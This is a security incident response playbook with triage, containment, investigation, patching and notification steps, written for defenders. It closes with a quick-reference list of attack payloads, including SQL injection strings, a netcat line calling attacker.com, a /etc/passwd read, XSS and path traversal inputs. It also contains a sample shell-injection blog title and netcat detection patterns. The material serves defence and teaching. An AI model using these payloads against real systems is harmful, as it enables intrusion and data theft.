# Security Incident Response Playbook

> Step-by-step procedures for responding to security incidents.
> Based on real-world incidents across 30+ production projects.

## Quick Reference

| Incident Type | Severity | Response Time | First Actions |
|---------------|----------|---------------|---------------|
| Data breach | P0 | Immediate | Isolate, preserve logs, notify legal |
| Active exploit | P0 | Immediate | Block attacker, patch vulnerability |
| Auth bypass | P0 | Immediate | Disable affected feature, revoke sessions |
| DOS/DDOS | P1 | 15 minutes | Enable rate limiting, block IPs |
| Vulnerability disclosure | P1 | 1 hour | Validate, assess impact, patch |
| Suspicious activity | P2 | 4 hours | Investigate logs, monitor |

**Severity Levels:**
- **P0 (Critical)**: Active exploitation, data breach, auth bypass
- **P1 (High)**: Exploitable vulnerability, service disruption
- **P2 (Medium)**: Suspicious activity, potential vulnerability

---

## Phase 1: Detection & Triage (0-15 minutes)

### 1.1 Incident Detection Channels

Incidents may be detected through:
- [ ] Automated alerts (monitoring, SIEM, IDS)
- [ ] Security researchers / responsible disclosure
- [ ] Customer reports
- [ ] Team member discovery
- [ ] Third-party security scan reports

### 1.2 Initial Assessment

**Gather basic information:**

```bash
# What happened?
INCIDENT_TYPE="[SQL injection / Auth bypass / Data breach / etc]"
INCIDENT_TIME="[When was it first detected?]"
AFFECTED_SYSTEMS="[Which services/databases/APIs?]"
ATTACK_VECTOR="[How did they get in?]"
```

**Classify severity:**

- [ ] **P0**: Active exploitation, confirmed data access, auth bypass
- [ ] **P1**: Exploitable vulnerability exists, service disruption
- [ ] **P2**: Suspicious activity, unconfirmed vulnerability

**Quick checks:**

```bash
# Check recent access logs
tail -n 1000 /var/log/nginx/access.log | grep -E "40[13]|50[023]"

# Check auth attempts
grep "auth.failed" /var/log/app.log | tail -50

# Check database activity
# (Postgres)
SELECT pid, usename, client_addr, state, query
FROM pg_stat_activity
WHERE state = 'active'
ORDER BY query_start DESC LIMIT 20;

# Check for unusual processes
ps aux | grep -E "nc|ncat|netcat|socat"
```

### 1.3 Assemble Response Team

**For P0/P1 incidents:**

- [ ] Incident Commander (makes decisions)
- [ ] Technical Lead (investigates & fixes)
- [ ] Communications Lead (internal & external comms)
- [ ] Legal/Compliance (if data breach)

**Communication channels:**

- Create dedicated Slack channel: `#incident-YYYY-MM-DD-[type]`
- Start incident doc: Google Doc or Notion page
- Set up war room if needed (Zoom/Meet)

---

## Phase 2: Containment (15-30 minutes)

### 2.1 Stop the Bleeding

**Immediate containment actions based on incident type:**

#### SQL Injection

```bash
# 1. Block attacker IP immediately
# Cloudflare
curl -X POST "https://api.cloudflare.com/client/v4/zones/{zone_id}/firewall/access_rules/rules" \
     -H "Authorization: Bearer ${CF_TOKEN}" \
     -d '{"mode":"block","configuration":{"target":"ip","value":"1.2.3.4"}}'

# Nginx
echo "deny 1.2.3.4;" >> /etc/nginx/conf.d/blocked_ips.conf
nginx -s reload

# 2. Enable query logging
# PostgreSQL
ALTER SYSTEM SET log_statement = 'all';
SELECT pg_reload_conf();

# MySQL
SET GLOBAL general_log = 'ON';

# 3. Review recent queries for damage
# Check for DROP, DELETE, UPDATE without WHERE
grep -E "DROP|DELETE.*FROM.*WHERE.*1=1|UPDATE.*SET.*WHERE.*1=1" /var/log/postgresql/postgresql.log
```

#### Authentication Bypass

```bash
# 1. Revoke all active sessions
# Redis-based sessions
redis-cli FLUSHDB

# Database-based sessions
# DELETE FROM sessions WHERE created_at < NOW();

# JWT tokens - rotate secret
# Update JWT_SECRET environment variable and restart

# 2. Force password reset for affected users
# UPDATE users SET password_reset_required = true WHERE id IN (...);

# 3. Disable vulnerable endpoint temporarily
# Add to nginx.conf:
location /api/vulnerable-endpoint {
    return 503 "Temporarily unavailable for maintenance";
}
nginx -s reload
```

#### XSS / Content Injection

```bash
# 1. Purge CDN cache
# Cloudflare
curl -X POST "https://api.cloudflare.com/client/v4/zones/{zone_id}/purge_cache" \
     -H "Authorization: Bearer ${CF_TOKEN}" \
     -d '{"purge_everything":true}'

# 2. Add Content-Security-Policy immediately
# Add to _headers or middleware:
Content-Security-Policy: default-src 'self'; script-src 'self'

# 3. Sanitize affected content
# UPDATE posts SET content = sanitize_html(content) WHERE id IN (...);
```

#### Command Injection

```bash
# 1. Kill affected processes
ps aux | grep [malicious_pattern]
kill -9 [PID]

# 2. Disable vulnerable feature
# Comment out route or add feature flag check

# 3. Check for persistence mechanisms
crontab -l
cat /etc/cron.d/*
ls -la /tmp
ls -la ~/.ssh/
```

#### Data Breach / Unauthorized Access

```bash
# 1. Preserve evidence (before making changes!)
# Take database snapshot
pg_dump dbname > /backup/incident-$(date +%Y%m%d-%H%M%S).sql

# Save current logs
cp -r /var/log /backup/logs-$(date +%Y%m%d-%H%M%S)

# 2. Revoke compromised credentials
# Rotate API keys
# Rotate database passwords
# Rotate JWT secrets

# 3. Block attacker access
# (See SQL Injection steps above)
```

#### DDoS / Rate Limit Abuse

```bash
# 1. Enable rate limiting immediately
# Cloudflare - Enable "I'm Under Attack" mode
# Or rate limit via code:

# Cloudflare Workers/Functions
const RATE_LIMIT = 10;  // requests per minute
const WINDOW = 60;

# 2. Block attacking IPs
# Get top offenders:
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20

# Block them:
for ip in 1.2.3.4 5.6.7.8; do
    echo "deny $ip;" >> /etc/nginx/conf.d/blocked_ips.conf
done
nginx -s reload

# 3. Enable caching for attacked endpoints
# Add Cache-Control headers
# Enable Cloudflare caching
```

### 2.2 Preserve Evidence

**CRITICAL: Do this BEFORE making changes**

```bash
# Create evidence directory
INCIDENT_ID="$(date +%Y%m%d-%H%M%S)"
mkdir -p /incident-response/$INCIDENT_ID

# Copy logs
cp -r /var/log/* /incident-response/$INCIDENT_ID/logs/

# Database snapshot
pg_dump dbname > /incident-response/$INCIDENT_ID/database-snapshot.sql

# Application state
docker ps -a > /incident-response/$INCIDENT_ID/docker-ps.txt
docker logs [container] > /incident-response/$INCIDENT_ID/app-logs.txt

# Network connections
netstat -tulpn > /incident-response/$INCIDENT_ID/netstat.txt
ss -tulpn > /incident-response/$INCIDENT_ID/ss.txt

# Running processes
ps auxf > /incident-response/$INCIDENT_ID/processes.txt

# Make evidence immutable
chmod -R 444 /incident-response/$INCIDENT_ID/
```

---

## Phase 3: Investigation (30-60 minutes)

### 3.1 Determine Scope

**Key questions to answer:**

- [ ] When did the incident start?
- [ ] What data was accessed?
- [ ] What data was modified/deleted?
- [ ] How many users affected?
- [ ] Was attacker authenticated?
- [ ] What was the attack vector?
- [ ] Are there other vulnerabilities?

**Investigation commands:**

```bash
# Find attacker's IP from logs
grep "suspicious_request_pattern" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq

# Find all requests from attacker IP
ATTACKER_IP="1.2.3.4"
grep "$ATTACKER_IP" /var/log/nginx/access.log > /incident-response/$INCIDENT_ID/attacker-requests.log

# Database queries from attacker session
# SELECT query, query_start, state
# FROM pg_stat_activity
# WHERE client_addr = '1.2.3.4';

# Find affected users
# SELECT id, email FROM users
# WHERE last_login_ip = '1.2.3.4'
# OR created_from_ip = '1.2.3.4';

# Check for data exfiltration
grep "SELECT.*FROM users\|SELECT.*FROM customers\|SELECT.*FROM orders" /var/log/postgresql/postgresql.log | grep "$ATTACKER_IP"
```

### 3.2 Root Cause Analysis

**Identify the vulnerability:**

```bash
# SQL Injection - Find vulnerable code
grep -r "execute.*f\"\|query.*+" . --include="*.py" --include="*.js"

# Command Injection - Find exec/system calls
grep -r "exec\|system\|eval" . --include="*.py" --include="*.js"

# Auth bypass - Check authentication logic
grep -r "if.*password\|verify_password\|check_auth" . --include="*.py" --include="*.js"

# XSS - Find innerHTML usage
grep -r "innerHTML" . --include="*.js" --include="*.jsx"
```

**From our lessons - common root causes:**

| Vulnerability | Root Cause | Lesson Reference |
|---------------|------------|------------------|
| Auth bypass | Auth headers not forwarded through proxy | LESSON: Auth Headers Lost Through Proxy |
| SQL injection | String concatenation in queries | OWASP Injection |
| Command injection | user input in shell commands | LESSON: Shell Injection in Git Commit Messages |
| XSS | innerHTML without sanitization | LESSON: XSS Prevention |
| False positives | Password fields in security scanning | LESSON: Exclude Password Fields |

### 3.3 Timeline Reconstruction

Create incident timeline:

```
[YYYY-MM-DD HH:MM] - Attacker first accessed system
[YYYY-MM-DD HH:MM] - Vulnerability exploited
[YYYY-MM-DD HH:MM] - Data accessed/exfiltrated
[YYYY-MM-DD HH:MM] - Incident detected
[YYYY-MM-DD HH:MM] - Containment actions taken
[YYYY-MM-DD HH:MM] - Vulnerability patched
```

---

## Phase 4: Eradication (1-4 hours)

### 4.1 Patch the Vulnerability

**SQL Injection Fix:**

```python
# Before (vulnerable)
query = f"SELECT * FROM users WHERE id = '{user_id}'"
db.execute(query)

# After (fixed)
query = "SELECT * FROM users WHERE id = %s"
db.execute(query, (user_id,))
```

**Command Injection Fix:**

```javascript
// Before (vulnerable)
exec(`git commit -m "${userInput}"`);

// After (fixed)
const fs = require('fs').promises;
const tmpFile = `/tmp/commit-msg-${Date.now()}.txt`;
await fs.writeFile(tmpFile, userInput);
spawn('git', ['commit', '-F', tmpFile]);
```

**XSS Fix:**

```javascript
// Before (vulnerable)
element.innerHTML = userContent;

// After (fixed)
element.textContent = userContent;
// OR
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userContent);
```

**Auth Bypass Fix:**

```nginx
# Add to nginx.conf
location /api {
    proxy_pass http://backend;
    proxy_set_header Authorization $http_authorization;
    proxy_pass_request_headers on;
}
```

### 4.2 Deploy Fix

```bash
# 1. Test fix locally
npm test
pytest

# 2. Deploy to staging
git push staging

# 3. Run security tests on staging
./scripts/security-tests.sh staging

# 4. Deploy to production
git push production

# 5. Verify fix
./scripts/smoke-test.sh production
```

### 4.3 Additional Hardening

**Add defense in depth:**

```bash
# 1. Enable WAF rules
# Cloudflare WAF - Enable managed ruleset

# 2. Add rate limiting
# See SECURITY-REVIEW-CHECKLIST.md

# 3. Add monitoring/alerting
# Set up alerts for similar patterns

# 4. Enable audit logging
# Log all sensitive operations
```

---

## Phase 5: Recovery (4-24 hours)

### 5.1 Restore Normal Operations

```bash
# 1. Re-enable disabled features
# Remove temporary blocks from nginx.conf
# Re-enable feature flags

# 2. Verify all systems operational
./scripts/smoke-test.sh production

# 3. Monitor for issues
# Watch logs for errors
tail -f /var/log/app.log | grep ERROR
```

### 5.2 Notify Affected Users

**For data breaches:**

```
Subject: Security Incident Notification

Dear [User],

We are writing to inform you about a security incident that may have
affected your account.

What happened:
[Brief description of incident]

What data was affected:
[List specific data types: email, name, etc. - NOT full details]

What we've done:
- Patched the vulnerability
- Forced password reset for your account
- Enhanced security monitoring

What you should do:
- Reset your password (required)
- Enable two-factor authentication
- Monitor your account for suspicious activity
- [Additional specific actions]

We take security seriously and sincerely apologize for this incident.

For questions: security@yourcompany.com
```

### 5.3 Regulatory Notifications

**If PII/PHI was accessed:**

- [ ] Notify legal team immediately
- [ ] Determine regulatory requirements:
  - GDPR: 72 hours to notify authorities
  - HIPAA: 60 days to notify affected individuals
  - CCPA: "Without unreasonable delay"
- [ ] Prepare breach notification documents
- [ ] Notify regulatory bodies as required

---

## Phase 6: Post-Incident (1-7 days)

### 6.1 Post-Mortem

**Schedule post-mortem within 48 hours**

Template:

```markdown
# Security Incident Post-Mortem

**Date**: YYYY-MM-DD
**Incident ID**: [ID]
**Severity**: P0/P1/P2
**Duration**: [Detection to resolution]

## Summary
[2-3 sentence summary]

## Timeline
[Full timeline from Phase 3.3]

## Root Cause
[Technical root cause]
[Process failures that allowed it]

## Impact
- Users affected: [number]
- Data accessed: [description]
- Systems compromised: [list]
- Downtime: [duration]

## What Went Well
- [Positive aspects of response]

## What Went Wrong
- [Areas for improvement]

## Action Items
| Action | Owner | Due Date | Status |
|--------|-------|----------|--------|
| [Specific improvement] | [Name] | [Date] | Open |

## Lessons Learned
[Will be added to LESSONS.md]
```

### 6.2 Add to Lessons

**Create new lesson in LESSONS.md:**

```markdown
### LESSON: [Brief Title]
**Source**: [Project] | **Date**: YYYY-MM-DD

**Symptom**: [What users/team observed]

**Root Cause**: [Technical reason]

**Solution**:
```[language]
[Code example of fix]
```

**Prevention**:
- [ ] [Specific check to prevent recurrence]
- [ ] [Another prevention measure]

**Impact**: [Scope and severity]
```

### 6.3 Security Improvements

**Implement preventive measures:**

```bash
# 1. Add security tests
# Create test case that would have caught this

# 2. Update security checklist
# Add new items to SECURITY-REVIEW-CHECKLIST.md

# 3. Enhance monitoring
# Add alerts for similar attack patterns

# 4. Update runbooks
# Document new procedures discovered
```

### 6.4 Sync Improvements to All Projects

```bash
# Add lesson to master repository
cd ~/Development/streamlined-development
echo "[New lesson content]" >> .claude/LESSONS.md

# Update security skill if needed
# Edit .claude/skills/security-owasp/SKILL.md

# Bump version and sync
./scripts/bump-version.sh minor "Security: Add lesson from [incident]"
./scripts/deploy-to-all.sh --auto
```

---

## Communication Templates

### Internal Incident Alert

```
🚨 SECURITY INCIDENT - P0/P1

Type: [SQL Injection / Auth Bypass / etc]
Status: Contained / Under Investigation / Resolved
Affected: [Systems/Data]
Impact: [User-facing impact]

Actions Taken:
- [List key actions]

Current Status:
- [What's happening now]

Next Steps:
- [What's next]

Incident Channel: #incident-YYYY-MM-DD
Incident Commander: @name
```

### External Status Page Update

```
We are currently investigating a security issue affecting [service].

Status: Investigating / Monitoring / Resolved
Impact: [Description]
Workaround: [If available]

Updates will be posted here as we learn more.

Last updated: [Timestamp]
```

### Security Researcher Response

```
Thank you for reporting this security issue.

We take security seriously and are investigating your report.

Timeline:
- Initial response: Within 4 hours
- Validation: Within 24 hours
- Fix deployed: Within 7 days (depending on severity)

We will keep you updated on our progress.

Our security policy: https://yoursite.com/security

Best regards,
Security Team
```

---

## Escalation Paths

### When to Escalate

**To CEO/Leadership:**
- Data breach affecting >100 users
- Media attention likely
- Regulatory notification required
- Ongoing active exploitation

**To Legal:**
- Any data breach with PII/PHI
- Regulatory requirements triggered
- Potential liability issues

**To External Security Firm:**
- Sophisticated persistent attack
- Internal team needs additional expertise
- Forensic analysis required

### Contact List

Maintain in separate private document:

```
Security Team:
- Security Lead: [Name] [Email] [Phone]
- On-call: [Rotation schedule]

Leadership:
- CEO: [Name] [Email] [Phone]
- CTO: [Name] [Email] [Phone]

Legal:
- General Counsel: [Name] [Email] [Phone]

External:
- Security Firm: [Company] [Emergency Line]
- Insurance: [Company] [Policy #] [Phone]
```

---

## Security Incident Metrics

**Track and review quarterly:**

| Metric | Target | Purpose |
|--------|--------|---------|
| Mean Time to Detect (MTTD) | <15 min | How fast we notice |
| Mean Time to Respond (MTTR) | <30 min | How fast we contain |
| Mean Time to Resolve (MTTR) | <4 hours | How fast we fix |
| False Positive Rate | <5% | Alert quality |
| Post-Mortem Completion | 100% | Learning from incidents |

---

## Appendix: Real-World Incident Examples

### Example 1: Shell Injection in Git Commits

**From**: blog-content-automation | 2026-01-16

**Detection**: Code review identified vulnerability
**Vulnerability**: User input (blog post titles) concatenated into git commit command
**Attack Vector**: Blog title like "AI in 2025; echo 'hacked' > /tmp/pwned"
**Fix**: Changed from string escaping to temp file approach
**Impact**: Caught before exploitation
**Lesson**: NEVER concatenate user input into shell commands

### Example 2: Password Fields in Security Scanning

**From**: Enterprise-Translation-System | 2026-01-01

**Detection**: Customer reported login failure with "SUSPICIOUS_REQUEST"
**Vulnerability**: Security pattern matching scanned password fields
**Attack Vector**: User password contained `&;|$` characters
**Fix**: Excluded password fields from security scanning
**Impact**: Users locked out for 6 hours
**Lesson**: Exclude password/token fields from pattern matching

### Example 3: Auth Headers Lost Through Proxy

**From**: ContentSage | 2024-12-26

**Detection**: 401 errors only in production, worked locally
**Vulnerability**: Nginx proxy didn't forward Authorization header
**Attack Vector**: N/A (configuration issue, not attack)
**Fix**: Added `proxy_set_header Authorization $http_authorization`
**Impact**: All API requests failing in production
**Lesson**: Test auth through actual proxy in staging

---

## Quick Reference: Common Attack Patterns

```bash
# SQL Injection Patterns
' OR '1'='1
'; DROP TABLE users--
' UNION SELECT * FROM passwords--

# Command Injection Patterns
; ls -la
$(whoami)
`cat /etc/passwd`
| nc attacker.com 1234

# XSS Patterns
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Path Traversal
../../etc/passwd
....//....//etc/passwd
..%2F..%2Fetc%2Fpasswd
```

---

## Version History

- v1.0.0 (2026-01-17): Initial playbook based on 30+ projects
- Incorporates lessons from 83 production incidents
- Aligned with OWASP Top 10 2021

**Next Review**: 2026-04-17 (90 days)
